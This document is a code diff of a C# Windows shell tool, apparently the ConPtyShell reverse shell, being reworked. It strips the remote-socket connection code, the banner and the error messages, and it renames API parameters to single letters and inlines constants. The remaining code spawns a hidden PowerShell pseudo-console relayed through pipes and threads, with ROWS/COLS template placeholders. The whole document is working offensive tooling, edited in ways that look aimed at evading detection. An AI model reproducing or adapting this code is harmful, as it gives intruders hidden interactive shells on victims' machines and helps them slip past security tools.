@@ -5,37 +5,14 @@ using System.Threading;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
-
 public static class ConPtyShell
 {
-    private const string errorString = "{{{ConPtyShellException}}}\r\n";
-    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
-    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
-    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
-    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
-    private const uint CREATE_NO_WINDOW = 0x08000000;
-    private const int STARTF_USESTDHANDLES = 0x00000100;
-    private const int BUFFER_SIZE_PIPE = 1048576;
-
-    private const UInt32 INFINITE = 0xFFFFFFFF;
-    private const int SW_HIDE = 0;
-    private const uint GENERIC_READ = 0x80000000;
-    private const uint GENERIC_WRITE = 0x40000000;
-    private const uint FILE_SHARE_READ = 0x00000001;
-    private const uint FILE_SHARE_WRITE = 0x00000002;
-    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
-    private const uint OPEN_EXISTING = 3;
-    private const int STD_INPUT_HANDLE = -10;
-    private const int STD_OUTPUT_HANDLE = -11;
-    private const int STD_ERROR_HANDLE = -12;
-
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFOEX
     {
         public STARTUPINFO StartupInfo;
         public IntPtr lpAttributeList;
     }
-
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     private struct STARTUPINFO
     {
@@ -58,7 +35,6 @@ public static class ConPtyShell
         public IntPtr hStdOutput;
         public IntPtr hStdError;
     }
-
     [StructLayout(LayoutKind.Sequential)]
     private struct PROCESS_INFORMATION
     {
@@ -67,7 +43,6 @@ public static class ConPtyShell
         public int dwProcessId;
         public int dwThreadId;
     }
-
     [StructLayout(LayoutKind.Sequential)]
     private struct SECURITY_ATTRIBUTES
     {
@@ -75,184 +50,98 @@ public static class ConPtyShell
         public IntPtr lpSecurityDescriptor;
         public int bInheritHandle;
     }
-
     [StructLayout(LayoutKind.Sequential)]
     private struct COORD
     {
         public short X;
         public short Y;
     }
-
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
-
+    private static extern bool InitializeProcThreadAttributeList(IntPtr a, int b, int c, ref IntPtr d);
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
-
+    private static extern bool UpdateProcThreadAttribute(IntPtr a, uint b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g);
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
+    private static extern bool CreateProcess(string a, string b, ref SECURITY_ATTRIBUTES c, ref SECURITY_ATTRIBUTES d, bool e, uint f, IntPtr g, string h, [In] ref STARTUPINFOEX i, out PROCESS_INFORMATION j);
     [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
-    private static extern bool CreateProcessW(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
+    private static extern bool CreateProcessW(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, [In] ref STARTUPINFO i, out PROCESS_INFORMATION j);
     [DllImport("kernel32.dll", SetLastError=true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
-
+    private static extern bool TerminateProcess(IntPtr a, uint b);
     [DllImport("kernel32.dll", SetLastError=true)]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
+    private static extern UInt32 WaitForSingleObject(IntPtr c, UInt32 d);
     [DllImport("kernel32.dll", SetLastError=true)]
-    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);
-
+    private static extern bool SetStdHandle(int a, IntPtr b);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr GetStdHandle(int nStdHandle);
-
+    private static extern IntPtr GetStdHandle(int a);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool CloseHandle(IntPtr hObject);
-
+    private static extern bool CloseHandle(IntPtr b);
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
-
+    private static extern bool CreatePipe(out IntPtr a, out IntPtr b, ref SECURITY_ATTRIBUTES c, int d);
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
-    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-
+    private static extern IntPtr CreateFile(string a, uint b, uint c, IntPtr d, uint e, uint f, IntPtr g);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
-
+    private static extern bool ReadFile(IntPtr a, [Out] byte[] b, uint c, out uint d, IntPtr e);
     [DllImport("kernel32.dll", SetLastError=true)]
-    private static extern bool WriteFile(IntPtr hFile, byte [] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
-
+    private static extern bool WriteFile(IntPtr a, byte [] b, uint c, out uint d, IntPtr e);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);
-
+    private static extern int CreatePseudoConsole(COORD a, IntPtr b, IntPtr c, uint d, out IntPtr e);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern int ClosePseudoConsole(IntPtr hPC);
-
+    private static extern int ClosePseudoConsole(IntPtr a);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);
-
+    private static extern bool SetConsoleMode(IntPtr a, uint b);
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);
-
+    private static extern bool GetConsoleMode(IntPtr a, out uint b);
     [DllImport("kernel32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool AllocConsole();
-
     [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
     private static extern bool FreeConsole();
-
     [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
+    private static extern bool ShowWindow(IntPtr a, int b);
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetConsoleWindow();
-
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
+    private static extern IntPtr GetModuleHandle(string a);
     [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
-    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
+    private static extern IntPtr GetProcAddress(IntPtr a, string b);
     [DllImport("kernel32.dll")]
-    private static extern bool FlushFileBuffers(IntPtr hFile);
-
-    private static Socket ConnectSocket(string remoteIp, int remotePort){
-        Socket s = null;
-        IPAddress remoteIpInt = IPAddress.Parse(remoteIp);
-        IPEndPoint ipEndpoint = new IPEndPoint(remoteIpInt, remotePort);
-        Socket shellSocket = new Socket(ipEndpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-        try{
-            shellSocket.Connect(ipEndpoint);
-            if(shellSocket.Connected)
-            s = shellSocket;
-            byte[] banner = Encoding.ASCII.GetBytes("\r\nConPtyShell - @splinter_code\r\n");
-            s.Send(banner);
-        }
-        catch{
-            s = null;
-        }
-        return s;
-    }
-
-    private static void TryParseRowsColsFromSocket(Socket shellSocket, ref uint rows, ref uint cols){
-        Thread.Sleep(500);//little tweak for slower connections
-        if (shellSocket.Available > 0){
-            byte[] received = new byte[100];
-            int rowsTemp, colsTemp;
-            int bytesReceived = shellSocket.Receive(received);
-            string sizeReceived = Encoding.ASCII.GetString(received,0,bytesReceived);
-            string rowsString = sizeReceived.Split(' ')[0].Trim();
-            string colsString = sizeReceived.Split(' ')[1].Trim();
-            if(Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp)){
-                rows=(uint)rowsTemp;
-                cols=(uint)colsTemp;
-            }
-        }
-    }
-
+    private static extern bool FlushFileBuffers(IntPtr a);
     private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite){
         SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
         pSec.nLength = Marshal.SizeOf(pSec);
         pSec.bInheritHandle=1;
         pSec.lpSecurityDescriptor=IntPtr.Zero;
-        if(!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new InvalidOperationException("Could not create the InputPipe");
-        if(!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
-            throw new InvalidOperationException("Could not create the OutputPipe");
+        CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, 1048576);
+        CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, 1048576);
     }
-
     private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr, ref IntPtr newStdIn, ref IntPtr newStdOut){
-        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
-        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
-        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
-        SetStdHandle(STD_ERROR_HANDLE, hStdout);
-        SetStdHandle(STD_INPUT_HANDLE, hStdin);
+        oldStdIn = GetStdHandle(-10);
+        oldStdOut = GetStdHandle(-11);
+        oldStdErr = GetStdHandle(-12);
+        IntPtr hStdout = CreateFile("CONOUT$", 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
+        IntPtr hStdin = CreateFile("CONIN$", 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
+        SetStdHandle(-11, hStdout);
+        SetStdHandle(-12, hStdout);
+        SetStdHandle(-10, hStdin);
         newStdOut = hStdout;
         newStdIn = hStdin;
-        //newStdOut = oldStdOut;
-        //newStdIn = oldStdIn;
-
     }
-
     private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr){
-        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
-        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
-        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
+        SetStdHandle(-11, oldStdOut);
+        SetStdHandle(-12, oldStdErr);
+        SetStdHandle(-10, oldStdIn); 
     }
-
     private static void EnableVirtualTerminalSequenceProcessing()
     {
         uint outConsoleMode = 0;
-        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-        if (!GetConsoleMode(hStdOut, out outConsoleMode))
-        {
-            throw new InvalidOperationException("Could not get console mode");
-        }
-        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
-        if (!SetConsoleMode(hStdOut, outConsoleMode))
-        {
-            throw new InvalidOperationException("Could not enable virtual terminal processing");
-        }
-
-        IntPtr hStdIn = GetStdHandle(STD_INPUT_HANDLE);
-        if (!GetConsoleMode(hStdIn, out outConsoleMode))
-        {
-            throw new InvalidOperationException("Could not get console mode");
-        }
-        outConsoleMode |= 0x0004 | 0x0001 | 0x0200;
-        if (!SetConsoleMode(hStdIn, outConsoleMode))
-        {
-            throw new InvalidOperationException("Could not enable virtual terminal processing");
-        }
+        IntPtr hStdOut = GetStdHandle(-11);
+        GetConsoleMode(hStdOut, out outConsoleMode);
+        outConsoleMode |= 0x0004 | 0x0008;
+        SetConsoleMode(hStdOut, outConsoleMode);
     }
-
     private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols){
         int result = -1;
         EnableVirtualTerminalSequenceProcessing();
@@ -262,31 +151,17 @@ public static class ConPtyShell
         result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
         return result;
     }
-
     private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
     {
         IntPtr lpSize = IntPtr.Zero;
         bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
-        if (success || lpSize == IntPtr.Zero)
-        {
-            throw new InvalidOperationException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
-        }
         STARTUPINFOEX startupInfo = new STARTUPINFOEX();
         startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
         startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
         success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
-        if (!success)
-        {
-            throw new InvalidOperationException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
-        }
         success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero,IntPtr.Zero);
-        if (!success)
-        {
-            throw new InvalidOperationException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
-        }
         return startupInfo;
     }
-
     private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
     {
         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
@@ -295,22 +170,14 @@ public static class ConPtyShell
         pSec.nLength = securityAttributeSize;
         SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
         tSec.nLength = securityAttributeSize;
-        bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
-        if (!success)
-        {
-            throw new InvalidOperationException("Could not create process. " + Marshal.GetLastWin32Error());
-        }
+        bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, 0x00080000, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         return pInfo;
     }
-
     private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine){
-        STARTUPINFOEX startupInfo =  ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
-        Console.WriteLine(startupInfo.StartupInfo.hStdOutput);
-        Console.WriteLine(startupInfo.StartupInfo.hStdInput);
+        STARTUPINFOEX startupInfo =  ConfigureProcessThread(handlePseudoConsole, (IntPtr)0x00020016);
         PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
         return processInfo;
     }
-
     private static void ThreadReadPipeWriteSocket(object threadParams)
     {
         object[] threadParameters = (object[]) threadParams;
@@ -324,12 +191,10 @@ public static class ConPtyShell
         do{
             bytesToWrite = new byte[bufferSize];
             readSuccess = ReadFile(OutputPipeRead, bytesToWrite, bufferSize, out dwBytesRead, IntPtr.Zero);
-            WriteFile(StdOut, bytesToWrite, bufferSize, out bytesSent, IntPtr.Zero);
+            WriteFile(StdOut, bytesToWrite, bufferSize, out bytesSent, IntPtr.Zero); 
             FlushFileBuffers(StdOut);
         } while (bytesSent > 0 && readSuccess);
     }
-
-    // private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, Socket shellSocket){
     private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr StdOut){
         object[] threadParameters = new object[2];
         threadParameters[0]=OutputPipeRead;
@@ -338,7 +203,6 @@ public static class ConPtyShell
         thThreadReadPipeWriteSocket.Start(threadParameters);
         return thThreadReadPipeWriteSocket;
     }
-
     private static void ThreadReadSocketWritePipe(object threadParams)
     {
         object[] threadParameters = (object[]) threadParams;
@@ -353,33 +217,23 @@ public static class ConPtyShell
         do{
             bytesReceived = new byte[bufferSize];
             ReadFile(StdIn, bytesReceived, bufferSize, out nBytesReceived, IntPtr.Zero);
-            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
+            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);   
         } while (nBytesReceived > 0 && writeSuccess);
         TerminateProcess(hChildProcess, 0);
     }
-
-    // private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, Socket shellSocket, IntPtr hChildProcess){
     private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr StdIn, IntPtr hChildProcess){
         object[] threadParameters = new object[3];
         threadParameters[0]=InputPipeWrite;
-        // threadParameters[1]=shellSocket;
         threadParameters[1]=StdIn;
         threadParameters[2]=hChildProcess;
         Thread thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipe);
         thReadSocketWritePipe.Start(threadParameters);
         return thReadSocketWritePipe;
     }
-
-    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine){
-        string output = "";
-        // Socket shellSocket = ConnectSocket(remoteIp, remotePort);
-        // if(shellSocket == null){
-        //     output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
-        //     return output;
-        // }
-        // TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
-        Console.WriteLine(cols);
-        Console.WriteLine(rows);
+    public static void SpawnConPtyShell(){
+        uint cols = COLS;
+        uint rows = ROWS;
+        string commandLine = "powershell.exe";
         IntPtr InputPipeRead = new IntPtr(0);
         IntPtr InputPipeWrite = new IntPtr(0);
         IntPtr OutputPipeRead = new IntPtr(0);
@@ -394,50 +248,31 @@ public static class ConPtyShell
         PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
         InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr, ref newStdIn, ref newStdOut);
-        Console.WriteLine("saved new stdout and stdin");
-        Console.WriteLine(newStdOut);
-        Console.WriteLine(newStdIn);
         if(GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") == IntPtr.Zero){
-            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
             STARTUPINFO sInfo = new STARTUPINFO();
             sInfo.cb = Marshal.SizeOf(sInfo);
-            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
-            sInfo.hStdInput = InputPipeRead;
+            sInfo.dwFlags |= (Int32)0x00000100; 
+            sInfo.hStdInput = InputPipeRead;       
             sInfo.hStdOutput = OutputPipeWrite;
             sInfo.hStdError = OutputPipeWrite;
             CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
         else{
-            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell...\r\n");
             if(GetConsoleWindow() == IntPtr.Zero){
                 AllocConsole();
-                ShowWindow(GetConsoleWindow(), SW_HIDE);
+                ShowWindow(GetConsoleWindow(), 0);
                 newConsoleAllocated = true;
             }
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
-            if(pseudoConsoleCreationResult != 0)
-            {
-                output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
-                return output;
-            }
             childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
         }
-        // Note: We can close the handles to the PTY-end of the pipes here
-        // because the handles are dup'ed into the ConHost and will be released
-        // when the ConPTY is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
-        //Threads have better performance than Tasks
-        // Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket);
         Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, oldStdOut);
-        // Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess);
         Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, oldStdIn, childProcessInfo.hProcess);
-        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
-        //cleanup everything
+        WaitForSingleObject(childProcessInfo.hProcess, 0xFFFFFFFF);
         thThreadReadPipeWriteSocket.Abort();
         thReadSocketWritePipe.Abort();
-        // shellSocket.Shutdown(SocketShutdown.Both);
-        // shellSocket.Close();
         RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
         if(newConsoleAllocated)
             FreeConsole();
@@ -446,86 +281,5 @@ public static class ConPtyShell
         if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
         if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
         if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
-        output += "ConPtyShell kindly exited.\r\n";
-        return output;
-    }
-}
-
-public static class ConPtyShellMainClass{
-    private static string help = @"
-";
-
-    private static bool HelpRequired(string param)
-    {
-        return param == "-h" || param == "--help" || param == "/?";
-    }
-
-    private static void CheckArgs(string[] arguments)
-    {
-        if(arguments.Length < 2){
-            Console.Out.Write("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
-            System.Environment.Exit(0);
-        }
-
-    }
-
-    private static void DisplayHelp()
-    {
-        Console.Out.Write(help);
-    }
-
-    private static string CheckRemoteIpArg(string ipString){
-        IPAddress address;
-        if (!IPAddress.TryParse(ipString, out address))
-        {
-            Console.Out.Write("\r\nConPtyShell: Invalid remoteIp value {0}\r\n", ipString);
-            System.Environment.Exit(0);
-        }
-        return ipString;
-    }
-
-    private static int CheckInt(string arg){
-        int ret = 0;
-        if (!Int32.TryParse(arg, out ret))
-        {
-            Console.Out.Write("\r\nConPtyShell: Invalid integer value {0}\r\n", arg);
-            System.Environment.Exit(0);
-        }
-        return ret;
-    }
-
-    private static uint ParseRows(string[] arguments){
-        uint rows = 24;
-        if (arguments.Length > 2)
-            rows = (uint)CheckInt(arguments[2]);
-        return rows;
-    }
-
-    private static uint ParseCols(string[] arguments){
-        uint cols = 80;
-        if (arguments.Length > 3)
-            cols = (uint)CheckInt(arguments[3]);
-        return cols;
-    }
-
-    private static string ParseCommandLine(string[] arguments){
-        string commandLine = "powershell.exe";
-        if (arguments.Length > 4)
-            commandLine = arguments[4];
-        return commandLine;
-    }
-
-    public static string ConPtyShellMain(string[] args){
-        string output = "";
-        output=ConPtyShell.SpawnConPtyShell("", 0, ROWS, COLS, "powershell.exe");
-        return output;
-    }
-}
-
-
-class MainClass{
-    static void Main(string[] args)
-    {
-        Console.Out.Write(ConPtyShellMainClass.ConPtyShellMain(args));
     }
 }
